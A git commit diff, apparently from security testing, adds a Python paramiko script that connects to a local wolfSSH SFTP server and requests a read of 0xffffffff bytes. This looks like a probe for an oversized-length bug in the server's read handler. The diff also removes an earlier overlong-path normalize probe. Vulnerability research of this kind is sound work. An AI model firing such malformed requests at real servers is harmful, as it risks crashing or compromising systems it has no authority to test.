55082fb541950282441f31fb0e31e565c4286b10
Sarobidy <sarobidy.rakotonarivo.1@gmail.com>
2025-01-23 07:37:20 +0300

    feat: add script wolfSSH_SFTP_RecvRead

--- Script/wolfSSH_SFTP_RecvRead.py
+++ Script/wolfSSH_SFTP_RecvRead.py
@@ -1,22 +1,25 @@
 import paramiko
 import logging
+
+paramiko.SFTPFile.MAX_REQUEST_SIZE = 0xffffffff
+
 # Activer les logs de débogage
-#logging.basicConfig(level=logging.DEBUG)
+#logging.basicConfig(level=logging .DEBUG)
 # Détails de connexion
 hostname = "127.0.0.1"
 port = 22222
 username = "jill"
 password = "upthehill"
-
 # Créer un client SFTP
-transport = paramiko.Transport((hostname, port))
-transport.connect(username=username, password=password)
+transport = paramiko. Transport((hostname, port))
+transport. connect(username=username, password=password)
 sftp = paramiko.SFTPClient.from_transport(transport)
 
-sftp.normalize("../"+"a"*253)
+with sftp.open("duck.txt","r") as f:
+        f.read(0xffffffff)
 
 # Lister les fichiers dans le répertoire racine
-files = sftp.listdir('.')
+files = sftp. listdir('.')
 print("Fichiers sur le serveur SFTP:", files)
 # Fermer la connexion
 sftp.close()
